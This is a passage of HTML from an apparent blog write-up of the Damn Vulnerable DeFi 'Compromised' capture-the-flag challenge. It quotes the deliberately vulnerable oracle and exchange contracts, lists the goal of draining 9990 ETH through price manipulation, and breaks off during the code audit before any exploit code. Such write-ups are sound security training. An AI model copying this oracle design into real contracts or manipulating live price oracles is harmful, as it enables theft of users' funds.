1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Balance Settings</h2>\n<p>hardhat_setBalance ⇒ 2 ETH settigns (Balance)</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">'0xA73209FB1a42495120166736362A1DfA9F95A105',\n'0xe92401A4d3af5E446d93D11EEc806b1462b39D15',\n'0x81A5D6E50C214044bE44cA0CB057fe119097850c'</code></pre></div>\n<p>attacker Balance Settings ⇒ 0.1 ETH Settings (Balance)</p>\n<h2 id=\"oracle-contract-settings\" style=\"position:relative;\"><a href=\"#oracle-contract-settings\" aria-label=\"oracle contract settings permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Oracle Contract Settings</h2>\n<ul>\n<li>Deploy the oracle and setup the trusted soruces with initial prices</li>\n<li>TrustFulOracle Contract &#x3C;= TrustfulOracleInitializer Contract Setup</li>\n</ul>\n<h3 id=\"oracle-setup\" style=\"position:relative;\"><a href=\"#oracle-setup\" aria-label=\"oracle setup permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Oracle Setup</h3>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"./TrustfulOracle.sol\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">/**\n * @title TrustfulOracleInitializer\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">TrustfulOracleInitializer</span> <span class=\"token punctuation\">{</span>\n\n    <span class=\"token keyword\">event</span> <span class=\"token function\">NewTrustfulOracle</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> oracleAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    TrustfulOracle <span class=\"token keyword\">public</span> oracle<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">memory</span> sources<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">string</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">memory</span> symbols<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">memory</span> initialPrices\n    <span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{</span>\n        oracle <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">TrustfulOracle</span><span class=\"token punctuation\">(</span>sources<span class=\"token punctuation\">,</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        oracle<span class=\"token punctuation\">.</span><span class=\"token function\">setupInitialPrices</span><span class=\"token punctuation\">(</span>sources<span class=\"token punctuation\">,</span> symbols<span class=\"token punctuation\">,</span> initialPrices<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">NewTrustfulOracle</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>oracle<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>TrustfulOracleInitializer Contract Constructor <code class=\"language-text\">Sources, symbols, initialPricesState</code> variable initialization</li>\n<li>TrustfulOracle Contract instance initialization process in progress Use the specified address array</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token operator\">/</span> TrustfulOracle Contract\n<span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">memory</span> sources<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bool</span> enableInitialization<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>sources<span class=\"token punctuation\">.</span>length <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> sources<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">_setupRole</span><span class=\"token punctuation\">(</span>TRUSTED_SOURCE_ROLE<span class=\"token punctuation\">,</span> sources<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>enableInitialization<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token function\">_setupRole</span><span class=\"token punctuation\">(</span>INITIALIZER_ROLE<span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li><code class=\"language-text\">TRUSTED_SOURCE_ROLE</code> Grants the corresponding authority to the initially set up 3 addresses.</li>\n<li>Apply <code class=\"language-text\">INITIALIZER_ROLE</code> permission to <code class=\"language-text\">msg.sender</code>address based on <code class=\"language-text\">enableInitialization</code> value</li>\n<li>Privilege separation progress</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// TrustfulOracle Contract</span>\n<span class=\"token comment\">// A handy utility allowing the deployer to setup initial prices (only once)</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">setupInitialPrices</span><span class=\"token punctuation\">(</span>\n    <span class=\"token builtin\">address</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">memory</span> sources<span class=\"token punctuation\">,</span>\n    <span class=\"token builtin\">string</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">memory</span> symbols<span class=\"token punctuation\">,</span>\n    <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">memory</span> prices\n<span class=\"token punctuation\">)</span> \n    <span class=\"token keyword\">public</span>\n    onlyInitializer\n<span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// Only allow one (symbol, price) per source</span>\n    <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>sources<span class=\"token punctuation\">.</span>length <span class=\"token operator\">==</span> symbols<span class=\"token punctuation\">.</span>length <span class=\"token operator\">&amp;&amp;</span> symbols<span class=\"token punctuation\">.</span>length <span class=\"token operator\">==</span> prices<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> sources<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">_setPrice</span><span class=\"token punctuation\">(</span>sources<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> symbols<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> prices<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token function\">renounceRole</span><span class=\"token punctuation\">(</span>INITIALIZER_ROLE<span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>Based on the <code class=\"language-text\">_setPrice</code> function, each variable required for setup is designated to manage the data of the mapping structure.</li>\n<li>If you check the function, the <code class=\"language-text\">pricesBySource</code> double mapping structure allocates <code class=\"language-text\">price</code> to each value based on the symbol value based on the address and processes the event.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">function</span> <span class=\"token function\">_setPrice</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> source<span class=\"token punctuation\">,</span> <span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> symbol<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> newPrice<span class=\"token punctuation\">)</span> <span class=\"token keyword\">private</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token builtin\">uint256</span> oldPrice <span class=\"token operator\">=</span> pricesBySource<span class=\"token punctuation\">[</span>source<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>symbol<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  pricesBySource<span class=\"token punctuation\">[</span>source<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>symbol<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> newPrice<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">emit</span> <span class=\"token function\">UpdatedPrice</span><span class=\"token punctuation\">(</span>source<span class=\"token punctuation\">,</span> symbol<span class=\"token punctuation\">,</span> oldPrice<span class=\"token punctuation\">,</span> newPrice<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>After performing the overall setup, delete the initial setup authority of msg.sender based on renounceRole.</li>\n</ul>\n<h2 id=\"exchange-contract-settings\" style=\"position:relative;\"><a href=\"#exchange-contract-settings\" aria-label=\"exchange contract settings permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Exchange Contract Settings</h2>\n<ul>\n<li>TrustFulOracle Contract address</li>\n<li>msg.value { EXCHANGE_INITIAL_ETH_BALANCE = 9990 ether }</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> oracleAddress<span class=\"token punctuation\">)</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n    token <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">DamnValuableNFT</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    oracle <span class=\"token operator\">=</span> <span class=\"token function\">TrustfulOracle</span><span class=\"token punctuation\">(</span>oracleAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>You can check the setup of the TrustfulOracle contract and the NFT token contract initially set up earlier.</li>\n<li>When deploying this contract through distribution script analysis, the value of <code class=\"language-text\">msg.value</code> is assigned, so the balance of the Exchange Contract is in possession of 9990 ether.</li>\n</ul>\n<h2 id=\"damnvaluablenft-contract-settings\" style=\"position:relative;\"><a href=\"#damnvaluablenft-contract-settings\" aria-label=\"damnvaluablenft contract settings permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>DamnValuableNFT Contract Settings</h2>\n<ul>\n<li>exchange contract => token func()</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"tsx\"><pre class=\"language-tsx\"><code class=\"language-tsx\"><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>nftToken <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> DamnValuableNFTFactory<span class=\"token punctuation\">.</span><span class=\"token function\">attach</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>exchange<span class=\"token punctuation\">.</span><span class=\"token function\">token</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<h2 id=\"success-conditions\" style=\"position:relative;\"><a href=\"#success-conditions\" aria-label=\"success conditions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Success Conditions</h2>\n<ul>\n<li>exchange Contract Balance is ‘0’</li>\n<li>attacker address Balance is 9990 ether</li>\n<li>nftToken Balance Attacker is ‘0’</li>\n<li>oracle ⇒ getMedianPrice(”DVNFT”) == 999 ether</li>\n</ul>\n<h2 id=\"code-audit\" style=\"position:relative;\"><a href=\"#code-audit\" aria-label=\"code audit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Code Audit</h2>\n<blockquote>\n<p>Exchange.sol</p>\n</blockquote>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/utils/Address.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/security/ReentrancyGuard.sol\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"./TrustfulOracle.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"../DamnValuableNFT.sol\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">/**\n * @title Exchange\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Exchange</span> <span class=\"token keyword\">is</span> ReentrancyGuard <span class=\"token punctuation\">{</span>\n\n    <span class=\"token keyword\">using</span> <span class=\"token class-name\">Address</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">;</span>\n\n    DamnValuableNFT <span class=\"token keyword\">public</span> immutable token<span class=\"token punctuation\">;</span>\n    TrustfulOracle <span class=\"token keyword\">public</span> immutable oracle<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">event</span> <span class=\"token function\">TokenBought</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> buyer<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> tokenId<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> price<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">event</span> <span class=\"token function\">TokenSold</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> seller<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> tokenId<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> price<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> oracleAddress<span class=\"token punctuation\">)</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n        token <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">DamnValuableNFT</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        oracle <span class=\"token operator\">=</span> <span class=\"token function\">TrustfulOracle</span><span class=\"token punctuation\">(</span>oracleAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">buyOne</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> nonReentrant <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token builtin\">uint256</span> amountPaidInWei <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>amountPaidInWei <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Amount paid must be greater than zero\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">// Price should be in [wei / NFT]</span>\n        <span class=\"token builtin\">uint256</span> currentPriceInWei <span class=\"token operator\">=</span> oracle<span class=\"token punctuation\">.</span><span class=\"token function\">getMedianPrice</span><span class=\"token punctuation\">(</span>token<span class=\"token punctuation\">.</span><span class=\"token function\">symbol</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>amountPaidInWei <span class=\"token operator\">>=</span> currentPriceInWei<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Amount paid is not enough\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token builtin\">uint256</span> tokenId <span class=\"token operator\">=</span> token<span class=\"token punctuation\">.</span><span class=\"token function\">safeMint</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        <span class=\"token keyword\">payable</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">sendValue</span><span class=\"token punctuation\">(</span>amountPaidInWei <span class=\"token operator\">-</span> currentPriceInWei<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">TokenBought</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> tokenId<span class=\"token punctuation\">,</span> currentPriceInWei<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">return</span> tokenId<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">sellOne</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> tokenId<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> nonReentrant <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> token<span class=\"token punctuation\">.</span><span class=\"token function\">ownerOf</span><span class=\"token punctuation\">(</span>tokenId<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Seller must be the owner\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>token<span class=\"token punctuation\">.</span><span class=\"token function\">getApproved</span><span class=\"token punctuation\">(</span>tokenId<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Seller must have approved transfer\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">// Price should be in [wei / NFT]</span>\n        <span class=\"token builtin\">uint256</span> currentPriceInWei <span class=\"token operator\">=</span> oracle<span class=\"token punctuation\">.</span><span class=\"token function\">getMedianPrice</span><span class=\"token punctuation\">(</span>token<span class=\"token punctuation\">.</span><span class=\"token function\">symbol</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance <span class=\"token operator\">>=</span> currentPriceInWei<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Not enough ETH in balance\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        token<span class=\"token punctuation\">.</span><span class=\"token function\">transferFrom</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> tokenId<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        token<span class=\"token punctuation\">.</span><span class=\"token function\">burn</span><span class=\"token punctuation\">(</span>tokenId<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        <span class=\"token keyword\">payable</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">sendValue</span><span class=\"token punctuation\">(</span>currentPriceInWei<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">TokenSold</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> tokenId<span class=\"token punctuation\">,</span> currentPriceInWei<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token function\">receive</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<h3 id=\"init\" style=\"position:relative;\"><a href=\"#init\" aria-label=\"init permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Init</h3>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">using</span> <span class=\"token class-name\">Address</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">;</span>\n\nDamnValuableNFT <span class=\"token keyword\">public</span> immutable token<span class=\"token punctuation\">;</span>\nTrustfulOracle <span class=\"token keyword\">public</span> immutable oracle<span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">event</span> <span class=\"token function\">TokenBought</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> buyer<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> tokenId<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> price<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">event</span> <span class=\"token function\">TokenSold</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> seller<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> tokenId<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> price<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span 